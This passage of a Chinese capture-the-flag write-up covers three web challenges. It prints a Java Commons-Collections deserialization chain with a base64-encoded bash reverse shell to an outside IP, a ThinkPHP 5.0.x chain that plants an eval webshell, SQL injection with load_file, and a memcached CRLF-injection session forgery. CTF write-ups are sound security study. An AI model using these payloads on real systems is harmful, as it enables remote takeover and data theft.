class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjEi&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> SerializeUtils.base64serial(hashMap);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        SerializeUtils.base64deserial(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个base64也是自己意会。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#123;&#x27;serializeData&#x27;: &#x27;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAaWJhc2ggLWMge2VjaG8sWW1GemFDQXRZeUFpWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4NExqRXpNQzR5TkM0eE9EZ3ZOemMzTlNBOEpqRWl9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABwAAAABcQB+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAA2JiYng=&#x27;&#125;&quot; | grpc_cli call 8.147.133.227:32866 ProcessMsg --json_input</span><br></pre></td></tr></table></figure>
<p>后面直接反弹shell了。</p>
<h1 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h1><p>开局还有个zz东西，就是你的username不是admin<br>admin&#x3D;1&amp;password&#x3D;123456<br>进入后台，之后就是5.0.x的一条反序列化链子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php/index/admin/do_edit.html HTTP/1.1</span><br><span class="line">Host: eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 2500</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1700560980,1701446760,1702540036,1702548089; PHPSESSID=vv0dcps9gjic3qhnooqk9v36j2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3d%27YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YTo3OntpOjA7czo3OiJnZXRBdHRyIjtpOjE7czo0OiJpbmZvIjtpOjI7czo1OiJlcnJvciI7aTozO3M6NzoiY29tbWVudCI7aTo0O3M6ODoicXVlc3Rpb24iO2k6NTtzOjk6ImhpZ2hsaWdodCI7aTo2O3M6Nzoid2FybmluZyI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NDp7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6NzU6InBocDovL2ZpbHRlci93cml0ZT1zdHJpbmcucm90MTMvcmVzb3VyY2U9c3RhdGljLzw%2FY3VjIEByaW55KCRfVFJHWyduJ10pOyA%2FPiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czo0OiJ4aWdlIjt9fX1zOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InRlc3QiO3M6ODoiZ2V0RXJyb3IiO31zOjc6IgAqAGRhdGEiO2E6MTp7czo3OiJwYW5yZW50IjtzOjQ6InRydWUiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjU6e3M6NToibW9kZWwiO2I6MDtzOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjk6IgAqAHBhcmVudCI7TjtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjc6e2k6MDtzOjc6ImdldEF0dHIiO2k6MTtzOjQ6ImluZm8iO2k6MjtzOjU6ImVycm9yIjtpOjM7czo3OiJjb21tZW50IjtpOjQ7czo4OiJxdWVzdGlvbiI7aTo1O3M6OToiaGlnaGxpZ2h0IjtpOjY7czo3OiJ3YXJuaW5nIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo0OntzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czo3NToicGhwOi8vZmlsdGVyL3dyaXRlPXN0cmluZy5yb3QxMy9yZXNvdXJjZT1zdGF0aWMvPD9jdWMgQHJpbnkoJF9UUkdbJ24nXSk7ID8%2BIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtzOjQ6InhpZ2UiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntzOjI6Inh4IjtzOjI6Inh4Ijt9fXM6ODoiACoAbW9kZWwiO3M6NDoidGVzdCI7fX19fQ%3D%3D%27%09where%09`id`%3d1%23a=1&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883422641-ef7a04ef-5b29-45c6-8b1f-a6fef415af71.png#averageHue=%23232525&clientId=uad25b9a3-adf4-4&from=paste&id=u10bbbc39&originHeight=348&originWidth=780&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u99074787-f208-4d78-b58a-de88bd2978b&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883422642-bba6b3a9-1c09-485a-ac16-d473256338c1.png#averageHue=%23232525&clientId=uad25b9a3-adf4-4&from=paste&id=u2018ea88&originHeight=207&originWidth=845&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0020ff4c-9055-488c-a4b4-1dcc6d1f330&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883422667-8318b33c-80f0-42e3-b076-dcab00f28512.png#averageHue=%23232525&clientId=uad25b9a3-adf4-4&from=paste&id=u58d7ee42&originHeight=129&originWidth=655&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u2ff34604-f690-453d-9a5b-d9c7c917fbd&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883422631-a9d3cce4-76ec-470e-b848-427f7696288e.png#averageHue=%23242626&clientId=uad25b9a3-adf4-4&from=paste&id=u17165b89&originHeight=381&originWidth=850&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u5baa5510-aded-4cdc-a218-8f7895fbc8f&title="><br>遍历post的key。没限制。直接注入任意data<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883422706-93c997d8-b543-4f59-b1f5-898685a8faf4.png#averageHue=%23efecec&clientId=uad25b9a3-adf4-4&from=paste&id=u4c071f40&originHeight=636&originWidth=1920&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u92f9cffa-c9d7-48c7-87b8-e157dbe23e7&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883423277-8e5e6261-84e6-4b0b-9103-cb01a3bec66b.png#averageHue=%237d7c4d&clientId=uad25b9a3-adf4-4&from=paste&id=u53257c4e&originHeight=630&originWidth=1511&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ufdef1d94-6e3c-42cd-b1d4-1af22257bcf&title="><br>这里反序列化<br>打个exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;tag = &#x27;xige&#x27;;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27; =&gt; &#x27;php://filter/write=string.rot13/resource=static/&lt;?cuc @riny($_TRG[\&#x27;n\&#x27;]); ?&gt;&#x27;, // 因为 static 目录有写权限</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line">class Memcached &#123;</span><br><span class="line">    protected $handler;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;handler=new File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line">class Output &#123;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    private $handle;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;styles = [&quot;getAttr&quot;, &#x27;info&#x27;,</span><br><span class="line">            &#x27;error&#x27;,</span><br><span class="line">            &#x27;comment&#x27;,</span><br><span class="line">            &#x27;question&#x27;,</span><br><span class="line">            &#x27;highlight&#x27;,</span><br><span class="line">            &#x27;warning&#x27;];</span><br><span class="line">        $this-&gt;handle = new Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line">class Query &#123;</span><br><span class="line">    protected $model;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">class HasOne &#123;</span><br><span class="line">    public $model;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $parent;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;query = new Query(&quot;xx&quot;, &#x27;think\console\Output&#x27;);</span><br><span class="line">        $this-&gt;model = false;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line"></span><br><span class="line">abstract class Model &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model &#123;</span><br><span class="line">    public $parent;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $data = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;parent = new Output();</span><br><span class="line">        $this-&gt;error = new HasOne();</span><br><span class="line">        $this-&gt;model = &quot;test&quot;;</span><br><span class="line">        $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];</span><br><span class="line">        $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows &#123;</span><br><span class="line">    private $files = [];</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new Windows();</span><br><span class="line">$payload = serialize([$obj]);</span><br><span class="line">echo base64_encode($payload);</span><br></pre></td></tr></table></figure>
<p>修改数据-&gt;update data字段。内容是序列化数据。并且get的时候有限制。序列化字符得是是a:开头-&gt;访问商品详情触发反序列化。写static webshell</p>
<h1 id="thinkshopping"><a href="#thinkshopping" class="headerlink" title="thinkshopping"></a>thinkshopping</h1><p>服务器mysql未做设置，可以任意文件读取，那么我们在admin登录后直接读取flag文件即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php/index/admin/do_edit.html HTTP/1.1</span><br><span class="line">Host: eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 488</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com/public/index.php/index/admin/login.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,mg;q=0.7</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1701446760,1702540036,1702548089,1702783234; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1702786165; PHPSESSID=nucuu7f9vk71ojeseih8eropo4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dload_file(%27/fffflllaaaagggg%27)%09where%09`id`%3d1%23a=1&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A</span><br></pre></td></tr></table></figure>
<p>在thinkphp的cache-&gt;find()方法中有获取缓存的点位<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883423309-8b44c96a-f4b2-47d2-a240-636ff8256009.png#averageHue=%23232526&clientId=uad25b9a3-adf4-4&from=paste&id=u7ce1eb86&originHeight=739&originWidth=948&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u973ea51a-c9f7-474c-9689-a627ff6780d&title="><br>此处肯定是调用了memcache的get指令，并且存在CRLF注入，$key是think:shop.admin|test<br>test是我们拼贴（username）的地方。<br>这里比较玄学，用抓包的就可以，自己构造的就不可以，唯一不同的只有时间戳，说明时间戳有点讲究。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1222%00%0d%0aset think:shop.admin|1 0 1702802967 101%0d%0aa:3:&#123;s:2:&quot;id&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;e10adc3949ba59abbe56e057f20f883e&quot;;&#125;%0d%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883423456-dc155c5e-7f48-4b28-8142-0d6fc28f9756.png#averageHue=%239c9c9c&clientId=uad25b9a3-adf4-4&from=paste&id=ue678461e&originHeight=681&originWidth=1880&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9180a54b-3031-4ab4-9f9c-a8660dae036&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883423410-93a7c5b6-dd90-4cd3-8e5f-e3713488bb2d.png#averageHue=%23242626&clientId=uad25b9a3-adf4-4&from=paste&id=ub3f166d2&originHeight=513&originWidth=1616&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ue478719d-e68a-4acb-a1ed-dcdd47dfa13&title="></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">从memcacheget的$key为think:shop.admin|1 1是我们传入的用户名</span><br><span class="line">找到https://www.freebuf.com/vuls/328384.html</span><br><span class="line">memcached的问题。crlf。</span><br><span class="line"></span><br><span class="line">本地设置一个admin。登录抓set memcached的包</span><br><span class="line"></span><br><span class="line">最后构造</span><br><span class="line">username=1222%00%0d%0a%73%65%74%20%74%68%69%6e%6b%3a%73%68%6f%70%2e%61%64%6d%69%6e%7c%31%20%34%20%31%37%30%32%38%30%32%39%36%37%20%31%30%31%0d%0a%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%33%32%3a%22%65%31%30%61%64%63%33%39%34%39%62%61%35%39%61%62%62%65%35%36%65%30%35%37%66%32%30%66%38%38%33%65%22%3b%7d%0d%0aquit&amp;password=1</span><br><span class="line"></span><br><span class="line">然后username=1&amp;password=123456登录</span><br><span class="line"></span><br><span class="line">登录之后。后台sql注入load_file</span><br><span class="line"></span><br><span class="line">id=4&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dload_file(%27/fffflllaaaagggg%27)%09where%09id%3d4%23&amp;data=%23</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702883423554-1845ce32-be23-4936-968b-737ff24e5004.png#averageHue=%23f8f7f7&clientId=uad25b9a3-adf4-4&from=paste&id=u957d353d&originHeight=415&originWidth=1385&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u32b8308c-2b09-48a6-8c91-6c679865836&title="></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/QWB/" class="tag">#QWB</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/12/21/fragmented%20memories%20Recording/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">fragmented memories Recording</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
